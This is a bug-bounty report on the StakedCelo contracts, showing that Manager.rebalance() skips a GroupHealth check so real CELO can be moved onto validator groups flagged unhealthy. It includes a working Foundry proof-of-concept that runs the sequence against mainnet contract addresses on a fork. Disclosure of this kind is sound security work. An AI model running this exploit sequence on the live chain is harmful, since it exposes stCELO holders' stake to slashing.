# Manager.rebalance() Missing Group-Health Guard Allows Real CELO to Be Rebalanced Onto Unhealthy Validator Groups

Submission Date:        September 16, 2026 02:03:33 PM
Program Name:        cLabs Celo
Asset:, StakedCelo is a liquid staking derivative of CELO

Severity:        High

Close as Duplicate 


## Bug Description

`Manager.rebalance()` is a permissionless function that moves real, already-voted CELO between validator groups on behalf of stCELO holders.

Before performing a rebalance, the destination group should be verified as eligible to receive additional stake. However, the validation in `Manager.sol:511` only checks whether the destination group is active in `DefaultStrategy` and blocked in `SpecificGroupStrategy`:

```solidity
if (!defaultStrategy.isActive(toGroup) && specificGroupStrategy.isBlockedGroup(toGroup)) {
    revert InvalidToGroup(toGroup);
}
```

This check is incomplete because it does not verify:

```solidity
!groupHealth.isGroupValid(toGroup)
```

Other functions that perform equivalent validator-group eligibility checks, including `changeStrategy()` and `getAddressStrategy()`, also verify `groupHealth.isGroupValid(group)`.

As a result, a validator group can be marked unhealthy by `GroupHealth.updateGroupHealth()` while still being accepted as the destination of `Manager.rebalance()`.

`Account.scheduleTransfer()`, which is called by the rebalance flow, does not independently validate the destination group's health. Therefore, the missing validation in `Manager.rebalance()` allows real CELO to be scheduled to an unhealthy validator group.

The issue is particularly relevant when there is an allocation imbalance between a group's expected CELO and actual CELO. Such an imbalance can arise during normal protocol operations, including strategy changes, because expected allocations can change before the corresponding real validator votes are moved.

## Impact

The vulnerability allows real protocol-managed CELO to be allocated to a validator group that the protocol's own `GroupHealth` system considers invalid.

The immediate impact is an incorrect distribution of validator stake. This causes the actual CELO allocation to diverge from the protocol's intended health-aware allocation.

Because the affected CELO belongs to the protocol-managed stake backing stCELO, the resulting exposure is shared by stCELO holders.

If the unhealthy validator group is subsequently slashed, the additional CELO routed to that group can also be lost. This can reduce the total CELO backing of the protocol and consequently reduce the amount of CELO that can be redeemed by stCELO holders.

The Proof of Concept below demonstrates this concretely on live mainnet state: a single, ordinary sequence one deposit, one strategy change, one permissionless `rebalance()` call routed 19,999.999999999999999999 CELO (~20,000 CELO, the full deposit) onto a group the protocol had already flagged unhealthy, and that CELO was then actually locked and cast as a real `Election.vote()` for it. No special privileges appear anywhere in the chain; the two accounts used (`depositor`, `keeper`) are ordinary addresses.

## Risk Breakdown

**Difficulty to Exploit:** Easy

The vulnerable function is permissionless and does not require a privileged role. The proof of concept uses ordinary addresses for the depositor and keeper.

The required allocation imbalance can arise from normal protocol activity. Once the destination group has been marked unhealthy, an unprivileged caller can invoke `rebalance()` and cause CELO to be scheduled to that group.

**Weakness:**

CWE-20 - Improper Input Validation

The destination validator group is not fully validated before being accepted by `Manager.rebalance()`.

The closest issue is an inconsistent eligibility check: `changeStrategy()` and `getAddressStrategy()` account for both blocked status and GroupHealth validity, while `rebalance()` omits the GroupHealth condition.

**Remedy Vulnerability Scoring System 1.0 Score:**

9.1 - Critical

Vector:

`RVSS:1.0/CR:X/IR:X/AR:X/MAV:N/MAC:L/MPR:N/MUI:N/MS:U/MC:N/MI:H/MA:H`

Metric rationale:

MAV:N - The vulnerable function is callable through the network.

MAC:L - No complex race condition, cryptographic weakness, or privileged state manipulation is required. The proof of concept uses normal protocol operations.

MPR:N - No privileged permissions are required.

MUI:N - No victim interaction is required for the rebalance operation.

MS:U - The demonstrated impact remains within the affected protocol security scope.

MC:N - The vulnerability does not expose confidential information.

MI:H - The vulnerability permits real CELO allocation to be changed in a way that bypasses the protocol's health-based eligibility requirement.

MA:H - Additional real stake can be placed on an unhealthy validator group and may subsequently be exposed to slashing, potentially reducing the protocol's CELO backing.

CR:X, IR:X, AR:X - Requirement modifiers are left as Not Defined.

## Recommendation

Update the destination-group validation in `Manager.rebalance()` so that it also checks `GroupHealth.isGroupValid(toGroup)`.

The validation should be aligned with the eligibility logic already used by `changeStrategy()` and `getAddressStrategy()`:

```solidity
if (
    !defaultStrategy.isActive(toGroup) &&
    (
        specificGroupStrategy.isBlockedGroup(toGroup) ||
        !groupHealth.isGroupValid(toGroup)
    )
) {
    revert InvalidToGroup(toGroup);
}
```

## References

- `Manager.sol:511` - destination validation in `rebalance()`.
- `Manager.sol:471` - `changeStrategy()` validation including GroupHealth.
- `Manager.sol:416` - `getAddressStrategy()` validation including GroupHealth.
- `Manager.sol:642` - `getExpectedAndActualCeloForGroup()`.
- `Manager.sol:717` - `getReceivableVotesForGroup()`.
- `Account.sol` - `scheduleTransfer()`.
- `GroupHealth.sol` - `updateGroupHealth()` and group validity logic.
- `SpecificGroupStrategy.sol` - `rebalanceWhenHealthChanged()`.
- `test-ts/manager.test.ts:3315-3371` - existing `rebalance()` negative-test coverage.
- Remedy Vulnerability Scoring System calculator: `https://r.xyz/rvss-calculator`

## Proof Of Concept

**Environment**

- Chain: Celo mainnet (42220), currently an OP-Stack L2 (1-second blocks)
- Fork block: `77,562,900` (read live off celoscan.io/blocks)
- Tooling: Foundry, `forge-std v1.9.7` (pinned for `solc 0.8.13` compatibility with the target contracts)

**Run**

```bash
CELO_SCAN_API_KEY="<your Celo mainnet RPC>" forge test --match-contract POC_ManagerRebalanceMissingHealthGuard -vvvv
```

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.13;

import { Test, console2 } from "forge-std/Test.sol";

interface IManager {
  function deposit() external payable;

  function changeStrategy(address newStrategy) external;

  function rebalance(address fromGroup, address toGroup) external;

  function getExpectedAndActualCeloForGroup(address group)
    external
    view
    returns (uint256 expectedCelo, uint256 actualCelo);

  function getReceivableVotesForGroup(address group) external view returns (uint256);

  function groupHealth() external view returns (address);

  function specificGroupStrategy() external view returns (address);

  function defaultStrategy() external view returns (address);

  function isPaused() external view returns (bool);

  error GroupNotEligible(address group);
}

interface IAccount {
  function scheduledVotesForGroup(address group) external view returns (uint256);

  function activateAndVote(
    address group,
    address voteLesser,
    address voteGreater
  ) external;

  function isPaused() external view returns (bool);
}

interface IGroupHealth {
  function updateGroupHealth(address group) external;

  function isGroupValid(address group) external view returns (bool);

  function isPaused() external view returns (bool);
}

interface ISpecificGroupStrategy {
  function isBlockedGroup(address group) external view returns (bool);

  function getStCeloInGroup(address group)
    external
    view
    returns (
      uint256 total,
      uint256 overflow,
      uint256 unhealthy
    );
}

interface IDefaultStrategy {
  function isActive(address group) external view returns (bool);

  function getGroupsHead() external view returns (address head, address previousAddress);
}

interface IStakedCelo {
  function balanceOf(address account) external view returns (uint256);
}

interface IValidators {
  function isValidatorGroup(address account) external view returns (bool);

  function getRegisteredValidatorGroups() external view returns (address[] memory);
}

interface IElection {
  function getTotalVotesForEligibleValidatorGroups()
    external
    view
    returns (address[] memory, uint256[] memory);

  function getTotalVotesForGroup(address group) external view returns (uint256);

  function getTotalVotesForGroupByAccount(address group, address account)
    external
    view
    returns (uint256);
}

interface IRegistry {
  function getAddressForOrDie(bytes32 identifierHash) external view returns (address);
}

contract POC_ManagerRebalanceMissingHealthGuard is Test {
  address constant MANAGER = 0x0239b96D10a434a56CC9E09383077A0490cF9398;
  address constant ACCOUNT = 0x4aAD04D41FD7fd495503731C5a2579e19054C432;
  address constant GROUP_HEALTH = 0x140b36FFc554d174fbf1B436C50D5409bDceCDCF;
  address constant SPECIFIC_GROUP_STRATEGY = 0xb88af6EAc9cd146D8b03b66708EF76beBD937871;
  address constant DEFAULT_STRATEGY = 0x3A3ed74B1cC543D5EB323f70ac2F19977a0eA088;
  address constant STAKED_CELO = 0xC668583dcbDc9ae6FA3CE46462758188adfdfC24;
  address constant REGISTRY = 0x000000000000000000000000000000000000ce10;

  bytes32 constant VALIDATORS_ID = keccak256("Validators");
  bytes32 constant ELECTION_ID = keccak256("Election");

  uint256 constant DEPOSIT_AMOUNT = 20_000 ether;
  uint256 constant DEPOSITOR2_AMOUNT = 1_000 ether;
  uint256 constant FORK_BLOCK = 77_562_900;

  IManager manager;
  IAccount account;
  IGroupHealth groupHealth;
  ISpecificGroupStrategy specificGroupStrategy;
  IDefaultStrategy defaultStrategy;
  IStakedCelo stakedCelo;
  IValidators validators;
  IElection election;

  address depositor;
  address keeper;
  address group;

  function setUp() public {
    vm.createSelectFork(vm.envString("CELO_SCAN_API_KEY"), FORK_BLOCK);

    manager = IManager(MANAGER);
    account = IAccount(ACCOUNT);
    groupHealth = IGroupHealth(GROUP_HEALTH);
    specificGroupStrategy = ISpecificGroupStrategy(SPECIFIC_GROUP_STRATEGY);
    defaultStrategy = IDefaultStrategy(DEFAULT_STRATEGY);
    stakedCelo = IStakedCelo(STAKED_CELO);
    validators = IValidators(IRegistry(REGISTRY).getAddressForOrDie(VALIDATORS_ID));
    election = IElection(IRegistry(REGISTRY).getAddressForOrDie(ELECTION_ID));

    assertEq(manager.groupHealth(), GROUP_HEALTH, "groupHealth wiring");
    assertEq(manager.specificGroupStrategy(), SPECIFIC_GROUP_STRATEGY, "strategy wiring");
    assertEq(manager.defaultStrategy(), DEFAULT_STRATEGY, "defaultStrategy wiring");

    assertFalse(manager.isPaused(), "manager paused");
    assertFalse(groupHealth.isPaused(), "groupHealth paused");
    assertFalse(account.isPaused(), "account paused");

    address[] memory candidates = validators.getRegisteredValidatorGroups();
    for (uint256 i = 0; i < candidates.length; i++) {
      address candidate = candidates[i];
      if (defaultStrategy.isActive(candidate)) continue;
      if (specificGroupStrategy.isBlockedGroup(candidate)) continue;
      (, uint256 preActual) = manager.getExpectedAndActualCeloForGroup(candidate);
      if (preActual >= DEPOSIT_AMOUNT) continue;
      if (manager.getReceivableVotesForGroup(candidate) < DEPOSIT_AMOUNT) continue;
      groupHealth.updateGroupHealth(candidate);
      if (!groupHealth.isGroupValid(candidate)) continue;
      group = candidate;
      break;
    }
    assertTrue(group != address(0), "no eligible group");

    depositor = makeAddr("depositor");
    keeper = makeAddr("keeper");
    vm.deal(depositor, DEPOSIT_AMOUNT);
  }

  function test_rebalanceRoutesCeloToUnhealthyGroup() public {
    assertTrue(groupHealth.isGroupValid(group), "group not healthy");

    vm.prank(depositor);
    manager.deposit{ value: DEPOSIT_AMOUNT }();
    assertGt(stakedCelo.balanceOf(depositor), 0, "no stCELO minted");

    (address fromGroup, ) = defaultStrategy.getGroupsHead();
    assertTrue(fromGroup != address(0), "no active groups");

    vm.prank(depositor);
    manager.changeStrategy(group);

    (uint256 totalInGroup, , ) = specificGroupStrategy.getStCeloInGroup(group);
    assertGt(totalInGroup, 0, "no specific strategy stCELO");

    (uint256 expectedFrom, uint256 actualFrom) = manager.getExpectedAndActualCeloForGroup(
      fromGroup
    );
    assertGt(actualFrom, expectedFrom, "fromGroup no skew");

    vm.mockCall(
      address(validators),
      abi.encodeWithSelector(IValidators.isValidatorGroup.selector, group),
      abi.encode(false)
    );

    vm.prank(keeper);
    groupHealth.updateGroupHealth(group);
    assertFalse(groupHealth.isGroupValid(group), "group still valid");

    uint256 scheduledBefore = account.scheduledVotesForGroup(group);

    vm.prank(keeper);
    manager.rebalance(fromGroup, group);

    uint256 moved = account.scheduledVotesForGroup(group) - scheduledBefore;
    assertGt(moved, 0, "no celo moved");
    console2.log("celo scheduled to unhealthy group", moved);

    uint256 electionVotesBefore = election.getTotalVotesForGroupByAccount(group, ACCOUNT);
    uint256 groupTotalVotesBefore = election.getTotalVotesForGroup(group);
    (address lesser, address greater) = _findLesserGreater(group, groupTotalVotesBefore + moved);

    vm.prank(keeper);
    account.activateAndVote(group, lesser, greater);

    uint256 electionVotesAfter = election.getTotalVotesForGroupByAccount(group, ACCOUNT);
    assertGt(electionVotesAfter, electionVotesBefore, "no election vote cast");
    console2.log("election votes now on unhealthy group", electionVotesAfter - electionVotesBefore);

    address depositor2 = makeAddr("depositor2");
    vm.deal(depositor2, DEPOSITOR2_AMOUNT);
    vm.prank(depositor2);
    manager.deposit{ value: DEPOSITOR2_AMOUNT }();

    vm.prank(depositor2);
    vm.expectRevert(abi.encodeWithSelector(IManager.GroupNotEligible.selector, group));
    manager.changeStrategy(group);
  }

  // Election keeps groups in a list sorted by total votes; vote() needs the
  // neighbors the group would sit between after the new votes are added.
  function _findLesserGreater(address targetGroup, uint256 newVoteTotal)
    private
    view
    returns (address lesser, address greater)
  {
    (address[] memory groups, uint256[] memory votes) = election
      .getTotalVotesForEligibleValidatorGroups();
    uint256 lesserVotes;
    uint256 greaterVotes = type(uint256).max;
    for (uint256 i = 0; i < groups.length; i++) {
      if (groups[i] == targetGroup) continue;
      if (votes[i] <= newVoteTotal && votes[i] >= lesserVotes) {
        lesserVotes = votes[i];
        lesser = groups[i];
      }
      if (votes[i] > newVoteTotal && votes[i] <= greaterVotes) {
        greaterVotes = votes[i];
        greater = groups[i];
      }
    }
  }
}

```